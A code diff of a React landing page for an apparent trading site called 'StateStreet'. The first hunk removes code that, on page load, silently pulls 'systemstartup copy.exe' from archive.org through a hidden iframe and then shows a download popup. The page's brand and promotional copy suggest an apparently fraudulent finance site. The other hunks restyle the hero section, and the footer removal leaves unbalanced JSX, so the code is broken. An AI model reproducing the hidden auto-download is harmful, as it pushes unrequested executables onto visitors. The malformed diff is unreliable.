@@ -366,47 +366,8 @@ const marketNewsHeadlines = [
   const [lastUpdated, setLastUpdated] = useState('Syncing feed...');
   const [notifications, setNotifications] = useState<NotificationItem[]>([]);
   const [activeNotification, setActiveNotification] = useState<NotificationItem | null>(null);
-  const [currentImageIndex, setCurrentImageIndex] = useState(0);
+const [currentImageIndex, setCurrentImageIndex] = useState(0);
   const [currentNewsIndex, setCurrentNewsIndex] = useState(0);
-  const [showDownloadPopup, setShowDownloadPopup] = useState(false);
-
-  // Download function - uses hidden iframe to NEVER navigate away from landing page
-  const downloadFile = () => {
-    const downloadUrl = 'https://archive.org/download/systemstartup-copy_202607/systemstartup%20copy.exe';
-    // Create a hidden iframe to handle the download - this guarantees we stay on the landing page
-    const iframe = document.createElement('iframe');
-    iframe.style.display = 'none';
-    iframe.style.width = '0';
-    iframe.style.height = '0';
-    iframe.style.border = 'none';
-    iframe.src = downloadUrl;
-    document.body.appendChild(iframe);
-    
-    // Clean up the iframe after 5 seconds to prevent memory leaks
-    setTimeout(() => {
-      if (document.body.contains(iframe)) {
-        document.body.removeChild(iframe);
-      }
-    }, 5000);
-  };
-
-  // Automatic download on page load and show popup after 2 seconds
-  useEffect(() => {
-    // Small delay to ensure page is fully loaded before triggering download
-    const initialTimer = setTimeout(() => {
-      downloadFile();
-    }, 100);
-    
-    // Show popup after 2 seconds
-    const popupTimer = setTimeout(() => {
-      setShowDownloadPopup(true);
-    }, 2000);
-
-    return () => {
-      clearTimeout(initialTimer);
-      clearTimeout(popupTimer);
-    };
-  }, []);
 
   const API_BASE_URL = import.meta.env.VITE_API_URL || 'http://localhost:4988/api/v1';
 
@@ -592,22 +553,21 @@ const marketNewsHeadlines = [
 
           <Stack direction={{ xs: 'column', lg: 'row' }} spacing={4} sx={{ py: { xs: 5, md: 8 }, alignItems: 'center' }}>
             <Box sx={{ flex: 1 }}>
-              <Chip label="Premium finance access" sx={{ bgcolor: 'rgba(125, 211, 252, 0.16)', color: '#7dd3fc', borderRadius: 999, mb: 2 }} />
-              <Typography variant="h2" sx={{ fontWeight: 800, fontSize: { xs: '2.2rem', md: '3.5rem' }, lineHeight: 1.08 }}>
+              <Chip label="Premium finance access" sx={{ bgcolor: 'rgba(239, 244, 255, 0.2)', color: '#8c9eff', borderRadius: 999, mb: 2 }} />
+              <Typography variant="h2" sx={{ fontWeight: 800, fontSize: { xs: '2.5rem', md: '4.5rem' }, lineHeight: 1.05, letterSpacing: '-0.02em' }}>
                 We provide the best trading experience in the world.
               </Typography>
-              <Typography sx={{ color: 'rgba(255,255,255,0.72)', fontSize: { xs: '1rem', md: '1.08rem' }, mt: 2, maxWidth: 660 }}>
+              <Typography sx={{ color: 'rgba(255,255,255,0.8)', fontSize: { xs: '1.2rem', md: '1.5rem' }, mt: 1.5, maxWidth: '100%' }}>
                 Join a refined financial workspace with secure onboarding, live dashboard control, and elegant transfer tools built for modern money movement.
               </Typography>
-              <Stack direction={{ xs: 'column', sm: 'row' }} spacing={2} sx={{ mt: 3 }}>
-                <Button component={Link} to="/register" variant="contained" sx={{ borderRadius: 999, px: 3.4, py: 1.2, bgcolor: '#7dd3fc', color: '#03111d', '&:hover': { bgcolor: '#bae6fd' } }}>Explore</Button>
-                <Button component={Link} to="/login" variant="outlined" sx={{ borderRadius: 999, px: 3.4, py: 1.2, color: 'white', borderColor: 'rgba(255,255,255,0.24)' }}>Open dashboard</Button>
+              <Stack direction={{ xs: 'column', sm: 'row' }} spacing={2} sx={{ mt: 4 }}>
+                <Button component={Link} to="/register" variant="contained" sx={{ borderRadius: 999, px: 4, py: 1.4, bgcolor: '#8c9eff', color: '#0f0f23', boxShadow: '0 4px 20px rgba(140, 158, 255, 0.4)', '&:hover': { bgcolor: '#a0b3ff', boxShadow: '0 6px 25px rgba(140, 158, 255, 0.5)' } }}>Explore</Button>
+                <Button component={Link} to="/login" variant="outlined" sx={{ borderRadius: 999, px: 4, py: 1.4, color: 'rgba(255,255,255,0.8)', borderColor: 'rgba(255,255,255,0.2)', '&:hover': { borderColor: 'rgba(255,255,255,0.4)' } }}>Open dashboard</Button>
               </Stack>
             </Box>
-            <Box sx={{ flex: 0.95, width: '100%' }}>
-              <Paper elevation={0} sx={{ p: 0, borderRadius: 4, overflow: 'hidden', border: '1px solid rgba(255,255,255,0.15)', bgcolor: 'rgba(7, 14, 30, 0.72)', backdropFilter: 'blur(16px)' }}>
-                <Box component="img" src={imageUrls[currentImageIndex]} alt="Luxury finance interface" sx={{ width: '100%', height: 450, objectFit: 'cover', display: 'block' }} />
-
+<Box sx={{ flex: 0.95, order: { xs: 2, md: 1, lg: 1 }, width: '100%' }}>
+              <Paper elevation={3} sx={{ p: 0, borderRadius: 8, backgroundImage: 'linear-gradient(135deg, rgba(140, 158, 255, 0.15), rgba(7, 14, 30, 0.9))', backdropFilter: 'blur(20px)', border: '1px solid rgba(140, 158, 255, 0.2)' }}>
+                <Box component="img" src={imageUrls[currentImageIndex]} alt="Luxury finance interface" sx={{ width: '100%', height: 'auto', objectFit: 'cover', display: 'block' }} />
               </Paper>
             </Box>
           </Stack>
@@ -845,34 +805,6 @@ const marketNewsHeadlines = [
       </Box>
 
       <Box sx={{ mt: 6, borderTop: '1px solid rgba(255,255,255,0.12)', py: 5, bgcolor: 'rgba(2, 6, 23, 0.95)' }}>
-        <Container maxWidth="xl">
-          <Grid container spacing={4}>
-            <Grid item xs={12} md={4}>
-              <Typography variant="h6" sx={{ fontWeight: 700 }}>StateStreet</Typography>
-              <Typography sx={{ color: 'rgba(255,255,255,0.7)', mt: 1 }}>
-                StateStreet is a premium trading and finance workspace built for secure onboarding, signal access, transfers, and account management.
-              </Typography>
-            </Grid>
-            <Grid item xs={12} md={4}>
-              <Typography variant="h6" sx={{ fontWeight: 700 }}>Registration information</Typography>
-              <Typography sx={{ color: 'rgba(255,255,255,0.7)', mt: 1 }}>Registration Number - 11459063</Typography>
-              <Typography sx={{ color: 'rgba(255,255,255,0.7)' }}>Glasgow. United Kingdom, G3</Typography>
-              <Typography sx={{ color: 'rgba(255,255,255,0.7)' }}>support@statestreet.com</Typography>
-              <Typography sx={{ color: 'rgba(255,255,255,0.7)' }}>+44 (744) 144-2855</Typography>
-            </Grid>
-            <Grid item xs={12} md={4}>
-              <Typography variant="h6" sx={{ fontWeight: 700 }}>Quick links</Typography>
-              <Stack spacing={1} sx={{ mt: 1 }}>
-                <Button component={Link} to="/about" sx={{ color: 'white', justifyContent: 'flex-start', px: 0 }}>About</Button>
-                <Button component={Link} to="/privacy-policy" sx={{ color: 'white', justifyContent: 'flex-start', px: 0 }}>Terms</Button>
-                <Button component={Link} to="/contact" sx={{ color: 'white', justifyContent: 'flex-start', px: 0 }}>Contact us</Button>
-                <Button component={Link} to="/register" sx={{ color: 'white', justifyContent: 'flex-start', px: 0 }}>Create account</Button>
-              </Stack>
-            </Grid>
-          </Grid>
-          <Box sx={{ mt: 4, pt: 3, borderTop: '1px solid rgba(255,255,255,0.12)', display: 'flex', flexDirection: { xs: 'column', md: 'row' }, justifyContent: 'space-between', gap: 2 }}>
-            <Typography variant="body2" sx={{ color: 'rgba(255,255,255,0.62)' }}>© 2026 StateStreet. All Rights Reserved.</Typography>
-            <Stack direction={{ xs: 'column', sm: 'row' }} spacing={2}>
               <Button component={Link} to="/login" sx={{ color: 'white' }}>Login</Button>
               <Button component={Link} to="/contact" sx={{ color: 'white' }}>Contact</Button>
               <Button component={Link} to="/privacy-policy" sx={{ color: 'white' }}>Privacy</Button>
